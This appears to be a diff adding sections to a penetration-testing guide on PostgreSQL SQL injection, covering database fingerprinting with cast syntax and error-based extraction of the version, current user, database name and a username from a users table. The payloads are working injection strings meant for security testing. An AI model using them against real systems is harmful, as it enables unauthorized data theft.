@@ -53,22 +53,62 @@ If the first returns results and the second doesn't, injection likely exists.
 
 ### PostgreSQL-Specific Tests
 
+Use PostgreSQL-specific syntax to confirm the database type:
+
 ```sql
--- Test for PostgreSQL specifically
+-- PostgreSQL cast shorthand (::type)
+' AND 1::int=1--
+
+-- Using CAST function
 ' AND 1=CAST(1 AS int)--
+
+-- PostgreSQL-specific functions
 ' AND version() IS NOT NULL--
 ' AND current_database() IS NOT NULL--
+' AND current_schema() IS NOT NULL--
 ```
+
+The `::type` cast syntax is unique to PostgreSQL and won't work on MySQL or MSSQL.
 
 ### Error-Based Detection
 
 Force errors to confirm PostgreSQL:
 
 ```sql
+-- Basic type conversion error
 ' AND 1=CAST('a' AS int)--
+
+-- Using :: shorthand
+' AND 'a'::int=1--
 ```
 
 This should produce a PostgreSQL-specific error message indicating the database type.
+
+### Error-Based Data Extraction
+
+Extract data through error messages using type casting:
+
+```sql
+-- Extract version via CAST error
+' AND 1=CAST((SELECT version()) AS int)--
+
+-- Alternative: using :: syntax
+' AND (SELECT version())::int=1--
+
+-- Extract current user
+' AND 1=CAST((SELECT current_user) AS int)--
+
+-- Extract database name
+' AND 1=CAST((SELECT current_database()) AS int)--
+
+-- Extract with string markers (easier to find in error)
+' AND 1=CAST('~'||(SELECT version())||'~' AS NUMERIC)--
+
+-- Extract table data
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+```
+
+The error message will contain the string value that couldn't be converted, revealing the data.
 
 ### Time-Based Detection
 
